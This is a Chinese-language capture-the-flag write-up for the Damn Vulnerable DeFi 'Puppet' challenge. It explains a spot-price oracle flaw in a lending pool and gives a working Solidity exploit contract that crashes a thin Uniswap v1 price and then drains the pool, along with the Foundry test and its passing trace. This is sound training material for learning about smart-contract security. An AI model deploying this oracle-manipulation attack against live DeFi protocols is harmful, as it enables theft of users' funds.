## 题目 [Puppet](https://github.com/theredguild/damn-vulnerable-defi/tree/v4.0.0/src/puppet)
有一个借贷池，用户可以借出 Damn Valuable Tokens (DVTs)。要借出 DVT，用户首先需要存入两倍于借款金额的 ETH 作为抵押品。当前池子里有 100,000 DVT 的流动性。  

在一个旧的 Uniswap v1 交易所中，DVT 市场已经开启，目前有 10 ETH 和 10 DVT 的流动性。  

通过完成挑战来将借贷池中的所有代币转移出来，然后将这些代币存入指定的恢复账户。你开始时的余额是 25 ETH 和 1000 DVT。  

## 合约分析
`PuppetPool.sol` 合约是一个借贷池，需要存入两倍借款金额的 ether 作为抵押借出 DVT 代币。其中 DVT 的价格通过 pair 合约的代币余额的比值来计算，那么价格就可能被操控，尤其是流动性比较低的池子。
``` solidity
function _computeOraclePrice() private view returns (uint256) {
    // calculates the price of the token in wei according to Uniswap pair
    return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
}
```

## 题解
1. 由于池子很薄，我们把 1000 DVT 全部卖出，此时 DVT 价格暴跌。
2. 用 ether 抵押借贷出 pool 池中所有的 DVT 。

合约代码：
``` solidity
contract PuppetExploit {
    DamnValuableToken token;
    PuppetPool lendingPool;
    IUniswapV1Exchange uniswapV1Exchange;
    address recovery;

    constructor(
        DamnValuableToken _token,
        PuppetPool _lendingPool,
        IUniswapV1Exchange _uniswapV1Exchange,
        address _recovery 
    ) payable {
        token = _token;
        lendingPool = _lendingPool;
        uniswapV1Exchange = _uniswapV1Exchange;
        recovery = _recovery;
    }

    function attack(uint exploitAmount) public {
        uint256 tokenBalance = token.balanceOf(address(this));
        token.approve(address(uniswapV1Exchange), tokenBalance);
        uniswapV1Exchange.tokenToEthTransferInput(tokenBalance, 9, block.timestamp, address(this));
        lendingPool.borrow{value: address(this).balance}(
            exploitAmount,
            recovery
        );
    }

    receive() external payable {
    }
}
```

测试代码：
``` solidity
function test_puppet() public checkSolvedByPlayer {
    PuppetExploit exploit = new PuppetExploit{value:PLAYER_INITIAL_ETH_BALANCE}(
        token,
        lendingPool,
        uniswapV1Exchange,
        recovery
    );
    token.transfer(address(exploit), PLAYER_INITIAL_TOKEN_BALANCE);
    exploit.attack(POOL_INITIAL_TOKEN_BALANCE);
}
```

运行测试：
```
forge test --mp test/puppet/Puppet.t.sol -vvvv
```

测试结果：
```
[PASS] test_puppet() (gas: 387554)
Traces:
  [439754] PuppetChallenge::test_puppet()
    ├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C])
    │   └─ ← [Return] 
    ├─ [220842] → new PuppetExploit@0xce110ab5927CC46905460D930CCa0c6fB4666219
    │   └─ ← [Return] 658 bytes of code
    ├─ [29674] DamnValuableToken::transfer(PuppetExploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 1000000000000000000000 [1e21])
    │   ├─ emit Transfer(from: player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], to: PuppetExploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], amount: 1000000000000000000000 [1e21])
    │   └─ ← [Return] true
    ├─ [134144] PuppetExploit::attack(100000000000000000000000 [1e23])
    │   ├─ [519] DamnValuableToken::balanceOf(PuppetExploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219]) [staticcall]
    │   │   └─ ← [Return] 1000000000000000000000 [1e21]
    │   ├─ [24523] DamnValuableToken::approve(0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7, 1000000000000000000000 [1e21])
    │   │   ├─ emit Approval(owner: PuppetExploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], spender: 0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7, amount: 1000000000000000000000 [1e21])
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   ├─ [26172] 0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7::tokenToEthTransferInput(1000000000000000000000 [1e21], 9, 1, PuppetExploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219])
    │   │   ├─ [23093] 0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b::tokenToEthTransferInput(1000000000000000000000 [1e21], 9, 1, PuppetExploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219]) [delegatecall]
    │   │   │   ├─ [2519] DamnValuableToken::balanceOf(0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7) [staticcall]
    │   │   │   │   └─ ← [Return] 10000000000000000000 [1e19]
    │   │   │   ├─ [55] PuppetExploit::receive{value: 9900695134061569016}()
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ [6528] DamnValuableToken::transferFrom(PuppetExploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], 0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7, 1000000000000000000000 [1e21])
    │   │   │   │   ├─ emit Transfer(from: PuppetExploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], to: 0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7, amount: 1000000000000000000000 [1e21])
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   ├─ emit EthPurchase(buyer: PuppetExploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], tokens_sold: 1000000000000000000000 [1e21], eth_bought: 9900695134061569016 [9.9e18])
    │   │   │   └─ ← [Return] 9900695134061569016 [9.9e18]
    │   │   └─ ← [Return] 9900695134061569016 [9.9e18]
    │   ├─ [68373] PuppetPool::borrow{value: 34900695134061569016}(100000000000000000000000 [1e23], recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa])
    │   │   ├─ [519] DamnValuableToken::balanceOf(0xF0C36E5Bf7a10DeBaE095410c8b1A6E9501DC0f7) [staticcall]
    │   │   │   └─ ← [Return] 1010000000000000000000 [1.01e21]
    │   │   ├─ [55] PuppetExploit::receive{value: 15236365245263369016}()
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [29674] DamnValuableToken::transfer(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], 100000000000000000000000 [1e23])
    │   │   │   ├─ emit Transfer(from: PuppetPool: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], to: recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], amount: 100000000000000000000000 [1e23])
    │   │   │   └─ ← [Return] true
    │   │   ├─ emit Borrowed(account: PuppetExploit: [0xce110ab5927CC46905460D930CCa0c6fB4666219], recipient: recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa], depositRequired: 19664329888798200000 [1.966e19], borrowAmount: 100000000000000000000000 [1e23])
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [0] VM::getNonce(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C]) [staticcall]
    │   └─ ← [Return] 1
    ├─ [0] VM::assertEq(1, 1, "Player executed more than one tx") [staticcall]
    │   └─ ← [Return] 
    ├─ [519] DamnValuableToken::balanceOf(PuppetPool: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::assertEq(0, 0, "Pool still has tokens") [staticcall]
    │   └─ ← [Return] 
    ├─ [519] DamnValuableToken::balanceOf(recovery: [0x73030B99950fB19C6A813465E58A0BcA5487FBEa]) [staticcall]
    │   └─ ← [Return] 100000000000000000000000 [1e23]
    ├─ [0] VM::assertGe(100000000000000000000000 [1e23], 100000000000000000000000 [1e23], "Not enough tokens in recovery account") [staticcall]
    │   └─ ← [Return] 
    └─ ← [Stop] 

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 11.43ms (1.85ms CPU time)
```